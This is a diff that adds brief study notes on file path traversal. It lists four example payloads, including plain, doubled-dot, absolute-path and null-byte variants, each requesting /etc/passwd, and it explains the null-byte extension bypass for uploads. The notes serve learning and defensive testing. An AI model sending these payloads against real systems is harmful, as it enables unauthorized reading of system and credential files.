@@ -1,0 +1,13 @@
+---------------File Path Traversal---------------
+This vulnerability occurs when an attacker is able to manipulate input in a way that allows them to access files or directories outside of the intended directory. 
+
+Methods:
+Example: GET /image?filename=chairs125.jpg  HTTP 1.1
+1: GET /image?filename=../../../etc/passwd
+2: GET /image?filename=....//.....//.....//etc/passwd (url should be encoded)
+3: GET /image?filename=/etc/passwd
+4: GET /image?filename=../../../etc/passwd%00.jpg (\0/ null byte)
+
+Null byte bypass: in some programming language and file systems, a null byte (represented as '\0/') is used as a string terminator. For example if the application checks for the presence of '.jpg'
+but does not account for null bytes. an attacker could upload a file named "malicious.php\0.jpg". The application might interpret this as a .jpg file, while server treats it as a PHP file due to the 
+null byte, leading to code execution vulnerabilities.
